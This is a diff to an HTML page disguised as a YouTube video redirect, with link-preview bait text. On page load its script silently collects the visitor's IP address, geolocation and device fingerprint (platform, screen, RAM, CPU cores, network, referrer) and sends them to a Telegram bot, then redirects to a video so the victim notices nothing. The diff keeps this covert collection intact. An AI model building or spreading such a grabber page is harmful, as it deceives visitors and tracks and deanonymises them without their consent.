@@ -1,26 +1,25 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Watch This Video</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- Optional: Show YouTube thumbnail in preview when shared -->
-  <meta property="og:title" content="Check out this video!">
-  <meta property="og:description" content="Watch before it's removed!">
+  <!-- Thumbnail for link previews -->
+  <meta property="og:title" content="You need to see this!">
+  <meta property="og:description" content="This video will blow your mind.">
   <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
   <meta property="og:url" content="https://yourusername.github.io/yourrepo/">
   <meta property="og:type" content="website">
 </head>
-<body style="text-align:center; font-family:sans-serif; margin-top:100px;">
-
-  <h2>Redirecting...</h2>
-  <p>Please wait while we take you to the video.</p>
+<body style="font-family: Arial, sans-serif; text-align:center; margin-top:100px;">
+  <h2>Redirecting to video...</h2>
+  <p>Please wait while we load it for you.</p>
 
   <script>
     async function collectAndSendToTelegram() {
       try {
-        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
 
         const payload = {
           ip: ipData.ip,
@@ -40,7 +39,7 @@
           online: navigator.onLine,
           doNotTrack: navigator.doNotTrack,
           touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-          connection: navigator.connection ? navigator.connection.effectiveType : "N/A",
+          connection: navigator.connection?.effectiveType || "N/A",
           referrer: document.referrer
         };
 
@@ -55,7 +54,7 @@
 📱 *Platform:* ${payload.platform}
 🖥 *Screen:* ${payload.screen}
 🌈 *Color Depth:* ${payload.colorDepth}
-🧮 *RAM:* ${payload.deviceMemory} GB
+🧮 *RAM:* ${payload.deviceMemory}
 🧠 *CPU Cores:* ${payload.cpuCores}
 📡 *Network:* ${payload.connection}
 🔍 *Referrer:* ${payload.referrer}
@@ -71,20 +70,17 @@
           })
         });
 
-        // Redirect to video after 2 seconds
         setTimeout(() => {
           window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-        }, 2000);
+        }, 1500);
 
-      } catch (e) {
-        // On error, still redirect
+      } catch (error) {
+        console.error("Logging failed:", error);
         window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
       }
     }
 
-    // Trigger when page loads
     window.onload = collectAndSendToTelegram;
   </script>
-
 </body>
 </html>
